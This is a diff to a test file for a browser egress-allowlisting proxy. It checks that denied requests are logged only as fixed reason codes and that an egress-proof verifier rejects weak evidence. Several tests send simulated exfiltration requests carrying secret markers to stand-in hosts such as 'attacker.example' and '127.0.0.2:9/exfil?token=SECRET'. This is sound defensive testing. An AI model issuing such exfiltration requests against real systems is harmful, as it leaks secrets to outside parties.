@@ -1,6 +1,10 @@
 // @vitest-environment node
+import { spawnSync } from "node:child_process";
+import { mkdtempSync, rmSync, writeFileSync } from "node:fs";
 import http from "node:http";
 import net from "node:net";
+import { tmpdir } from "node:os";
+import path from "node:path";
 import { afterAll, beforeAll, describe, expect, it } from "vitest";
 import {
   BROWSER_EGRESS_PROXY_ENV,
@@ -9,8 +13,10 @@ import {
   browserEgressLaunchOptions,
   buildEgressAllowlist,
   createEgressProxy,
+  parseEgressDenialLog,
   startEgressProxy,
 } from "./browserEgressContainment.mjs";
+import { verifyEgressProofEvidence } from "./browserEgressProofVerify.mjs";
 
 const PK = "pk_test_ZXhhbXBsZS5jbGVyay5hY2NvdW50cy5kZXYk"; // example.clerk.accounts.dev
 const CONVEX = "https://happy-animal-123.convex.cloud";
@@ -133,7 +139,11 @@ describe("egress proxy semantics", () => {
     const result = await viaProxy("http://127.0.0.2:9/exfil?token=SECRET");
     expect(result.status).toBe(403);
     const recorded = proxy.denied.slice(before).join("\n");
-    expect(recorded).toContain("egress-denied GET 127.0.0.2:9 not-allowlisted");
+    // G4-01: only a fixed reason code is recorded. The method, host and port of
+    // a denied request are candidate-controlled bytes and must never be logged.
+    expect(recorded).toBe("egress-denied not-allowlisted-loopback");
+    expect(recorded).not.toContain("127.0.0.2");
+    expect(recorded).not.toContain("GET");
     expect(recorded).not.toContain("SECRET");
     expect(recorded).not.toContain("exfil");
   });
@@ -178,6 +188,166 @@ describe("createEgressProxy resolution safety", () => {
     });
     expect(status).toBe(502);
     expect(denied.join("\n")).toContain("unresolvable-or-private");
+    expect(denied.join("\n")).not.toContain("metadata.invalid");
     stop();
+  });
+});
+
+describe("verifyEgressProofEvidence and parseEgressDenialLog (G4-02)", () => {
+  const good = () => ({
+    ok: true,
+    failures: [],
+    collector: { tcpEvents: 0, udpPackets: 0 },
+    allowedStatus: 200,
+    topLevelNavigation: "failed",
+    channels: { "service-worker": "blocked" },
+    proxyDenials: { "not-allowlisted-loopback": 9, "not-allowlisted": 2, unrecognized: 0 },
+  });
+
+  it("accepts a complete passing proof", () => {
+    expect(verifyEgressProofEvidence(good())).toEqual([]);
+  });
+
+  it.each([
+    ["non-object evidence", null],
+    ["ok false", { ...good(), ok: false }],
+    ["ok missing", { ...good(), ok: undefined }],
+    ["a failure listed", { ...good(), failures: ["x"] }],
+    ["tcp collector traffic", { ...good(), collector: { tcpEvents: 1, udpPackets: 0 } }],
+    ["udp collector traffic", { ...good(), collector: { tcpEvents: 0, udpPackets: 1 } }],
+    ["collector counts missing", { ...good(), collector: undefined }],
+    ["allowlisted origin not 200", { ...good(), allowedStatus: 502 }],
+    ["service worker registered", { ...good(), channels: { "service-worker": "REGISTERED" } }],
+    ["service worker outcome missing", { ...good(), channels: {} }],
+    ["proxyDenials missing", { ...good(), proxyDenials: undefined }],
+    ["no loopback probe denial", { ...good(), proxyDenials: { "not-allowlisted": 4, unrecognized: 0 } }],
+    ["unrecognized log lines", { ...good(), proxyDenials: { "not-allowlisted-loopback": 1, unrecognized: 1 } }],
+    ["a reason outside the vocabulary", { ...good(), proxyDenials: { "not-allowlisted-loopback": 1, "evil.example:443": 1 } }],
+  ])("rejects %s", (_label, evidence) => {
+    expect(verifyEgressProofEvidence(evidence).length).toBeGreaterThan(0);
+  });
+
+  it("CLI exits non-zero for missing, empty, failing and passing-with-no-evidence files, zero for a full pass", () => {
+    const dir = mkdtempSync(path.join(tmpdir(), "egress-verify-"));
+    const run = (name: string, body: string | null) => {
+      const file = path.join(dir, name);
+      if (body !== null) writeFileSync(file, body);
+      return spawnSync(process.execPath, [path.join(__dirname, "browserEgressProofVerify.mjs"), file], {
+        encoding: "utf8",
+      });
+    };
+    try {
+      expect(run("missing.json", null).status).toBe(1);
+      expect(run("empty.json", "").status).toBe(1);
+      expect(run("fail.json", JSON.stringify({ ...good(), ok: false })).status).toBe(1);
+      expect(run("bare-ok.json", JSON.stringify({ ok: true })).status).toBe(1);
+      const pass = run("pass.json", JSON.stringify(good()));
+      expect(pass.status).toBe(0);
+      expect(pass.stdout).toContain("verified");
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  it("counts denials by fixed reason and flags anything else, including the old raw format", () => {
+    const parsed = parseEgressDenialLog(
+      [
+        "egress-allowlist 127.0.0.1:3000 localhost:3000",
+        "egress-proxy-listening 127.0.0.1:3129",
+        "egress-denied not-allowlisted-loopback",
+        "egress-denied not-allowlisted-loopback",
+        "egress-denied not-allowlisted",
+        "egress-denied GET 127.0.0.2:9 not-allowlisted",
+        "something else",
+        "",
+      ].join("\n"),
+    );
+    expect(parsed).toEqual({
+      denials: { "not-allowlisted-loopback": 2, "not-allowlisted": 1 },
+      unrecognized: 2,
+    });
+  });
+});
+
+// G4-01 (SCRUM-350 / SCRUM-784): the proxy log is uploaded as a workflow
+// artifact from a public repository. Candidate page code can encode QA
+// authority into the host labels or method of a request it knows will be
+// denied, so nothing candidate-controlled may reach the log.
+describe("egress proxy log carries only fixed reason codes (G4-01)", () => {
+  const MARKER = "sEcReTmArKeR9f3a";
+  const upstream = http.createServer((_req, res) => res.end("candidate-ok"));
+  const logged: string[] = [];
+  let proxy: Awaited<ReturnType<typeof startEgressProxy>>;
+  let upstreamPort = 0;
+
+  beforeAll(async () => {
+    upstreamPort = await listen(upstream);
+    proxy = await startEgressProxy({
+      allow: [`127.0.0.1:${upstreamPort}`],
+      port: 0,
+      log: (line) => logged.push(line),
+    });
+  });
+  afterAll(() => {
+    proxy.stop();
+    upstream.close();
+  });
+
+  function request(method: string, target: string): Promise<number> {
+    const url = new URL(target);
+    return new Promise((resolve) => {
+      const req = http.request(
+        { host: "127.0.0.1", port: proxy.port, method, path: target, headers: { host: url.host } },
+        (res) => {
+          res.resume();
+          res.on("end", () => resolve(res.statusCode ?? 0));
+        },
+      );
+      req.on("error", () => resolve(-1));
+      req.end();
+    });
+  }
+
+  function connectTo(authority: string): Promise<void> {
+    return new Promise((resolve) => {
+      const socket = net.connect(proxy.port, "127.0.0.1", () =>
+        socket.write(`CONNECT ${authority} HTTP/1.1\r\nHost: ${authority}\r\n\r\n`),
+      );
+      socket.once("data", () => {
+        socket.destroy();
+        resolve();
+      });
+      socket.on("error", () => resolve());
+    });
+  }
+
+  it("never logs a marker carried in the hostname, method, path, query or CONNECT authority", async () => {
+    const start = logged.length;
+    expect(await request("GET", `http://${MARKER}.attacker.example/${MARKER}?q=${MARKER}`)).toBe(403);
+    expect(await request("PURGE", `http://${MARKER}.attacker.example:8443/p`)).toBe(403);
+    expect(await request("GET", `http://127.0.0.2:9/${MARKER}?token=${MARKER}`)).toBe(403);
+    await connectTo(`${MARKER}.attacker.example:443`);
+    await connectTo(`${MARKER}-b.attacker.example:8443`);
+
+    const lines = logged.slice(start);
+    const everything = [...lines, ...proxy.denied].join("\n").toLowerCase();
+    expect(lines.length).toBeGreaterThanOrEqual(5);
+    expect(everything).not.toContain(MARKER.toLowerCase());
+    expect(everything).not.toContain("attacker");
+    expect(everything).not.toContain("purge");
+    expect(everything).not.toContain("127.0.0.2");
+    for (const line of lines) {
+      expect(line).toMatch(/^egress-denied (not-allowlisted|not-allowlisted-loopback)$/);
+    }
+  });
+
+  it("control: the denial itself is still evidenced by a fixed reason code", async () => {
+    const start = logged.length;
+    await request("GET", "http://127.0.0.2:9/x");
+    await request("GET", `http://${MARKER}.attacker.example/x`);
+    expect(logged.slice(start)).toEqual([
+      "egress-denied not-allowlisted-loopback",
+      "egress-denied not-allowlisted",
+    ]);
   });
 });
